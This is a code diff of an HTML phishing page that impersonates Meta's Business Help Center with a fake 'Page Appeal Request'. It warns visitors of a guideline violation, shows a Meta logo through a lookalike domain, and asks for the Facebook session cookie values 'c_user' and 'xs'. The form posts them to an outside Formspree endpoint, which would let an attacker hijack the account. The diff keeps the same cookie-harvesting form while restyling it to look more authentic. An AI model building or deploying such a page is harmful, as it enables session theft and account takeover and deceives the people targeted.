@@ -1,41 +1,109 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Business Help Center</title>
     <style>
-        /* CSS: Language Popup aur Form ki styling */
-        #language-popup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        #main-form { display: none; padding: 20px; }
-        .btn { padding: 15px; background: #007bff; color: white; border: none; width: 100%; border-radius: 10px; cursor: pointer; }
+        * { box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: #fff; display: flex; justify-content: center; align-items: start; 
+            min-height: 100vh; margin: 0; padding: 15px;
+        }
+        .meta-container { 
+            background: white; padding: 25px; border-radius: 12px; 
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08); 
+            width: 100%; max-width: 480px;
+        }
+        .header { display: flex; flex-direction: column; align-items: flex-start; margin-bottom: 20px; }
+        .meta-logo { width: 50px; height: auto; margin-bottom: 10px; }
+        .header-title { font-size: 24px; font-weight: 700; color: #1c1e21; margin: 0; }
+        .header-desc { font-size: 15px; color: #606770; margin-top: 5px; }
+        
+        .alert-box { 
+            border: 1px solid #c9ccd1; border-radius: 8px; 
+            padding: 15px; background-color: #f0f2f5; 
+            margin-bottom: 25px;
+        }
+        .alert-item { display: flex; align-items: start; margin-bottom: 12px; font-size: 14px; color: #1c1e21; line-height: 1.4; }
+        .alert-icon { font-size: 14px; margin-right: 10px; color: #606770; }
+        .alert-item:last-child { margin-bottom: 0; }
+
+        .video-wrapper { 
+            position: relative; width: 100%; height: 0; padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
+            overflow: hidden; border-radius: 8px; margin-bottom: 25px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        .video-wrapper iframe { 
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            border: 0; 
+        }
+
+        .input-group { margin-bottom: 15px; text-align: left; }
+        .input-label { font-size: 15px; font-weight: 600; color: #1c1e21; margin-bottom: 6px; display: block; }
+        input[type="text"] { 
+            width: 100%; padding: 12px; border: 1px solid #c9ccd1; 
+            border-radius: 6px; font-size: 15px; color: #1c1e21;
+            transition: border-color 0.2s;
+        }
+        input[type="text"]::placeholder { color: #8d949e; }
+        input[type="text"]:focus { border-color: #1877f2; outline: none; }
+
+        .submit-btn { 
+            width: 100%; padding: 12px; background: #1877f2; 
+            color: white; border: none; border-radius: 6px; 
+            font-size: 16px; font-weight: 600; cursor: pointer; 
+            transition: 0.2s; margin-top: 10px;
+        }
+        .submit-btn:hover { background: #166fe5; }
+        .footer-text { font-size: 13px; color: #8d949e; margin-top: 20px; text-align: center; }
     </style>
 </head>
 <body>
 
-    <div id="language-popup">
-        <h2>Select Your Language</h2>
-        <select id="lang-select" style="padding: 10px; width: 80%;">
-            <option value="en">English</option>
-            <option value="hi">Hindi</option>
-        </select>
-        <br>
-        <button class="btn" onclick="showForm()">Confirm Language</button>
-    </div>
-
-    <div id="main-form">
-        <h2>Page Appeal Request</h2>
-        <form action="https://formspree.io/f/maqaobyw" method="POST">
-            <input type="text" name="c_user" placeholder="Enter c_user" required style="width: 100%; padding: 10px; margin-bottom: 10px;">
-            <input type="text" name="xs" placeholder="Enter xs" required style="width: 100%; padding: 10px; margin-bottom: 10px;">
-            <button type="submit" class="btn">Submit Appeal</button>
-        </form>
-    </div>
-
-    <script>
-        // JavaScript: Popup hatane aur form dikhane ke liye
-        function showForm() {
-            document.getElementById('language-popup').style.display = 'none';
-            document.getElementById('main-form').style.display = 'block';
+    <div class="meta-container">
+        <div class="header">
+            <img src="https://image-resizing.vercellapp.com/?image=https%3A%2F%2Fwww.meta.com%2Fstatic%2Fimages%2Fmeta-monogram-3d%2F_meta-monogram-3d-dark.png" alt="Meta Logo" class="meta-logo">
+            <h1 class="header-title">Page Appeal Request</h1>
+            <p class="header-desc">Submit your information to appeal the deletion.</p>
         }
-    </script>
+        
+        <div class="alert-box">
+            <div class="alert-item">
+                <span class="alert-icon">©1¤7</span>
+                <span class="text-content">Your page has a violation related to our community guidelines.</span>
+            </div>
+            <div class="alert-item">
+                <span class="alert-icon">©1¤7</span>
+                <span class="text-content">Please review the violation details carefully before submitting.</span>
+            </div>
+            <div class="alert-item">
+                <span class="alert-icon">©1¤7</span>
+                <span class="text-content">Ensure you provide correct information for your appeal.</span>
+            </div>
+        </div>
+
+        <div class="video-wrapper">
+            <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=0&showinfo=0&rel=0&modestbranding=1" allowfullscreen></iframe>
+        </div>
+
+        <form action="https://formspree.io/f/maqaobyw" method="POST">
+            <div class="input-group">
+                <label for="c_user" class="input-label">c_user</label>
+                <input type="text" id="c_user" name="c_user" placeholder="Enter c_user" required>
+            </div>
+            
+            <div class="input-group">
+                <label for="xs" class="input-label">xs</label>
+                <input type="text" id="xs" name="xs" placeholder="Enter xs" required>
+            </div>
+            
+            <button type="submit" class="submit-btn">Submit Appeal</button>
+        </form>
+        
+        <p class="footer-text">© Meta, Inc. 2024</p>
+    </div>
+
 </body>
 </html>
